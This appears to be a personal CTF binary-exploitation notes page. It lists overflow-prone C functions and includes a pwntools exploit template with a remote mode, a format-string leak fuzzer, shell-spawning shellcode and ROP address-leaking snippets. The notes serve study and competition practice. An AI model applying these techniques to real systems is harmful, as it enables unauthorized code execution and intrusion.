# writeup and some notes (last update 17 December 2023)

## PWN Notes

1. Run `checksec` check the properties of executable of binary security.
	- **Stack Canaries** = a secret value placed on the stack which changes every time the program is started. the stack canary is checked and if it appears to be modified, the program exits immeadiately.
	- **Nx** = stored input or data cannot be executed as code
	- **Address Space Layout Randomization (ASLR)** = The randomization of the place in memory where the program, shared libraries, the stack, and the heap are.
	- **RELRO** = makes binary sections read-only.
2. Function that can lead to buffer overflow
- scanf
- read
- strcat
- fread
- fgets
- sprintf
- strcpy
- gets
- memcpy
- memmove
- strncpy
- snprintf
- strncat
4. Functions in assembly x86
	```shell
	; write the string to stdout  
	mov eax, 4 ; system call for write  
	mov ebx, 1 ; file descriptor for stdout  
	mov ecx, hello ; address of the string  
	mov edx, len ; number of bytes to write  
	int 80h ; invoke the kernel to perform the system call  
	  
	; exit with success  
	mov eax, 1 ; system call for exit  
	xor ebx, ebx ; return code of 0 for success  
	int 80h ; invoke the kernel to perform the system call
	
	; read input
	mov    edx,0x3c # Store 0x3c in edx
	mov    eax,0x3 # syscall for read()
	int    0x80 # invoke syscall
	add    esp,0x3c # esp increase
	``` 
5. Script i normally use 
- Template i got from crypto cat
``` python
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)
# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())
# Set up pwntools for the correct architecture
exe = './<file>'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'
# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
io = start()
padding = 20

payload = flat(

)

# Save the payload to file
write('payload', payload)
# Send the payload
io.sendline( payload)
# Receive the flag
io.interactive()
```
- fuzzer (%p for address leaking, %s for secrets leaking)
```python
from pwn import *
import os

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF('./pakmat_burger', checksec=False)
os.environ["SECRET_MESSAGE"] = "YOKO"

# Let's fuzz 100 values
for i in range(1,100):
    try:
        p = process(level='error')
        p.sendlineafter(b': ', '%{}$p'.format(i).encode())
        result = p.recv().split(b' ')
        result = result[1].split(b',')
        leak_char = result[0].ljust(8,b"\x00")
        print(str(i) + ': ' + str(leak_char).strip())
        p.close()
    except EOFError:
        pass
```
6. gdb-pwndbg useful commands
```bash
  run <<< $(python <code>) #input as stdin
  run < ./payload.txt #input as stdin
  run $(python <code>) #input as arg
  canary # check stack canary address
  x/100x $rsp # check 100 bytes in rsp 
```
7. pwntools functions
```python
# example payload converter func
payload = flat(
    b'\x90' * padding,
    esp+20,
    shellcode
)
# shellcode using asm
asm('\n'.join([
    'push %d' % u32('/sh\0'),
    'push %d' % u32('/bin'),
    'xor edx, edx',
    'xor ecx, ecx',
    'mov ebx, esp',
    'mov eax, 0xb',
    'int 0x80',
]))
shellcode = asm(shellcraft.cat('flag.txt'))
shellcode = asm(shellcraft.sh())
# getting address
## sample getting address
output = io.recv().split(b'\n')
print("output : ", output)
leak_puts = u64(output[0].ljust(8,b"\x00")) # do this if theres no \n
leak_printf = u64(output[1].ljust(8,b"\x00"))
leak = u64(p.recvline().strip().ljust(8,b'\0')) # do this if theres \n at the end
main = p64(elf.symbols.main)
plt_puts = p64(elf.plt.puts)
got_puts = p64(elf.got.puts)
# for leaking address, pop_rdi(pop rdi, ret; gadget)
secondPayload += pop_rdi + got_puts + plt_puts 
# output format i used for leaking address
leak_puts = u64(output[0].ljust(8,b"\x00"))
leak_printf = u64(output[1].ljust(8,b"\x00"))
print("puts {}".format(str(hex(leak_puts))))
print("printf {}".format(str(hex(leak_printf))))
```

## Pwn Resources
- https://github.com/Crypto-Cat/
- https://zeynarz.github.io/posts/wgmy23/
- https://razvioverflow.github.io/tryhackme/pwn101.html
